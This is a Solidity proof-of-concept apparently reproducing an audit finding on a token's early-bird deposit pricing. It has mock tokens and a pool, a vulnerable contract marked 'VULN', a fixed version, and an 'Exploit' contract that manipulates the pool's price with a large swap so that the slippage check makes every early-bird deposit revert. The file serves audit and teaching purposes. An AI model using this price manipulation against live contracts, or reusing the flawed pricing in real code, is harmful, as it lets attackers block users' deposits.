// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  ULTI early-bird deposits — Pashov, November 2024.
    For launchTimestamp + 1 day, depositPrice is 1e18/INITIAL_RATIO instead of
    the pool spot. A 250 ETH swap moves spot to 64% of that price. The 1%
    add-liquidity slippage check then reverts every deposit. Using spot,
    the same deposit succeeds.
*/

contract Erc20 {
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory s) {
        symbol = s;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Pool {
    Erc20 public inputToken;
    Erc20 public ulti;
    uint256 public inputReserve;
    uint256 public ultiReserve;

    constructor(Erc20 input_, Erc20 ulti_, uint256 x, uint256 y) {
        inputToken = input_;
        ulti = ulti_;
        inputReserve = x;
        ultiReserve = y;
    }

    function spotUltiPerInput() public view returns (uint256) {
        return ultiReserve * 1e18 / inputReserve;
    }

    function swapInputForUlti(uint256 dx) external returns (uint256 ultiOut) {
        require(inputToken.transferFrom(msg.sender, address(this), dx), "in");
        ultiOut = ultiReserve * dx / (inputReserve + dx);
        ultiReserve -= ultiOut;
        inputReserve += dx;
        require(ulti.transfer(msg.sender, ultiOut), "out");
    }

    function addLiquidity(uint256 inputAmt, uint256 ultiAmt, uint256 minInput, uint256 minUlti) external {
        uint256 ultiUsed = inputAmt * ultiReserve / inputReserve;
        uint256 inputUsed = inputAmt;
        if (ultiUsed > ultiAmt) {
            inputUsed = ultiAmt * inputReserve / ultiReserve;
            ultiUsed = ultiAmt;
        }
        require(ultiUsed >= minUlti, "Price slippage check");
        require(inputUsed >= minInput, "Price slippage check");
        require(inputToken.transferFrom(msg.sender, address(this), inputUsed), "pull in");
        require(ulti.transferFrom(msg.sender, address(this), ultiUsed), "pull ulti");
        inputReserve += inputUsed;
        ultiReserve += ultiUsed;
    }
}

contract Ulti {
    uint256 public constant EARLY_BIRD_PRICE_DURATION = 1 days;
    uint256 public constant INITIAL_RATIO = 1e15;
    uint256 public constant LP_CONTRIBUTION_PERCENTAGE = 50;
    uint256 public constant MAX_ADD_LP_SLIPPAGE_BPS = 100;

    uint256 public launchTimestamp;
    Erc20 public inputToken;
    Erc20 public ulti;
    Pool public pool;

    constructor(Erc20 input_, Erc20 ulti_, Pool pool_) {
        inputToken = input_;
        ulti = ulti_;
        pool = pool_;
        launchTimestamp = block.timestamp;
    }

    function deposit(uint256 inputTokenAmount) external {
        // @> VULN: early-bird depositPrice is the launch ratio, so a moved spot fails the slippage check
        uint256 depositPrice = 1e18 / INITIAL_RATIO;
        if (block.timestamp >= launchTimestamp + EARLY_BIRD_PRICE_DURATION) {
            depositPrice = pool.spotUltiPerInput() / 1e18;
        }
        uint256 inputTokenForLP = (inputTokenAmount * LP_CONTRIBUTION_PERCENTAGE) / 100;
        uint256 ultiForLP = inputTokenForLP * 1e18 / depositPrice;
        uint256 minUltiAmount = (ultiForLP * (10000 - MAX_ADD_LP_SLIPPAGE_BPS)) / 10000;
        uint256 minInputTokenAmount = (inputTokenForLP * (10000 - MAX_ADD_LP_SLIPPAGE_BPS)) / 10000;
        inputToken.transferFrom(msg.sender, address(this), inputTokenForLP);
        ulti.approve(address(pool), ultiForLP);
        inputToken.approve(address(pool), inputTokenForLP);
        pool.addLiquidity(inputTokenForLP, ultiForLP, minInputTokenAmount, minUltiAmount);
    }
}

contract UltiFixed {
    uint256 public constant LP_CONTRIBUTION_PERCENTAGE = 50;
    uint256 public constant MAX_ADD_LP_SLIPPAGE_BPS = 100;
    Erc20 public inputToken;
    Erc20 public ulti;
    Pool public pool;

    constructor(Erc20 input_, Erc20 ulti_, Pool pool_) {
        inputToken = input_;
        ulti = ulti_;
        pool = pool_;
    }

    function deposit(uint256 inputTokenAmount) external {
        uint256 depositPrice = 1e18 * pool.inputReserve() / pool.ultiReserve();
        uint256 inputTokenForLP = (inputTokenAmount * LP_CONTRIBUTION_PERCENTAGE) / 100;
        uint256 ultiForLP = inputTokenForLP * 1e18 / depositPrice;
        uint256 minUltiAmount = (ultiForLP * (10000 - MAX_ADD_LP_SLIPPAGE_BPS)) / 10000;
        uint256 minInputTokenAmount = (inputTokenForLP * (10000 - MAX_ADD_LP_SLIPPAGE_BPS)) / 10000;
        inputToken.transferFrom(msg.sender, address(this), inputTokenForLP);
        ulti.transferFrom(msg.sender, address(this), ultiForLP);
        ulti.approve(address(pool), ultiForLP);
        inputToken.approve(address(pool), inputTokenForLP);
        pool.addLiquidity(inputTokenForLP, ultiForLP, minInputTokenAmount, minUltiAmount);
    }
}

contract Exploit {
    uint256 public constant SWAP_IN = 250 ether;
    uint256 public constant DEPOSIT_IN = 10 ether;
    uint256 public constant START_X = 1000 ether;
    uint256 public constant START_Y = 1000 ether * 1e15;

    Erc20 public inputToken;
    Erc20 public ulti;
    Pool public pool;
    Ulti public market;
    uint256 public spotBefore;
    uint256 public ultiOut;
    uint256 public spotAfter;
    bool public depositReverted;

    constructor() {
        inputToken = new Erc20("WETH");
        ulti = new Erc20("ULTI");
        pool = new Pool(inputToken, ulti, START_X, START_Y);
        market = new Ulti(inputToken, ulti, pool);
        inputToken.mint(address(pool), START_X);
        ulti.mint(address(pool), START_Y);
        inputToken.mint(address(this), SWAP_IN + DEPOSIT_IN);
        ulti.mint(address(market), START_Y);
    }

    function run() external {
        spotBefore = pool.spotUltiPerInput();
        inputToken.approve(address(pool), SWAP_IN);
        ultiOut = pool.swapInputForUlti(SWAP_IN);
        spotAfter = pool.spotUltiPerInput();
        require(spotAfter * 100 < spotBefore * 99, "spot moved more than 1%");
        require(ultiOut == 2 * 10 ** 35, "bought 2e35 ULTI");
        require(block.timestamp < market.launchTimestamp() + 1 days, "still early bird");
        inputToken.approve(address(market), DEPOSIT_IN);
        (bool ok,) = address(market).call(abi.encodeWithSelector(market.deposit.selector, DEPOSIT_IN));
        depositReverted = !ok;
        require(depositReverted, "deposit was not refused");
        require(ulti.balanceOf(address(this)) == ultiOut, "only the swap ULTI was received");
        require(inputToken.balanceOf(address(this)) == DEPOSIT_IN, "deposit input was not taken");
    }
}
